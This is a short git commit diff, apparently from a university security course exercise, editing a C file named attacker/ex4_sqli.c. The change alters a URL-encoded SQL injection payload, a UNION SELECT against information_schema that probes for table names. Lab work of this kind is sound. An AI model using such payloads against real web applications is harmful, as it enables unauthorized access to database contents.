e2950862773c42b96b42ec51dbc0debfabe33ed1
Michael Terkeltoub <michael.terkeltoub@mail.huji.ac.il>
2026-01-14 13:19:07 +0200

    1

--- attacker/ex4_sqli.c
+++ attacker/ex4_sqli.c
@@ -1,5 +1,5 @@
 #define __MY_DEBUG__
-#define PAYLOAD "order_id%3d0%20UNION%20SELECT%20table_name%20FROM%20information_schema.TABLES%20WHERE%20table_name%20LIKE%20%27%25usr%25%27%20AND%20table_name%20LIKE%20%27a%25%27%20LIMIT%201%3b"
+#define PAYLOAD "order_id=0%20UNION%20SELECT%20table_name%20FROM%20information_schema.TABLES%20WHERE%20table_name%20LIKE%20%27%25usr%25%27%20AND%20table_name%20LIKE%20%27a%25%27%20LIMIT%201%3b"
 
 #include <limits.h>
 #include <string.h>
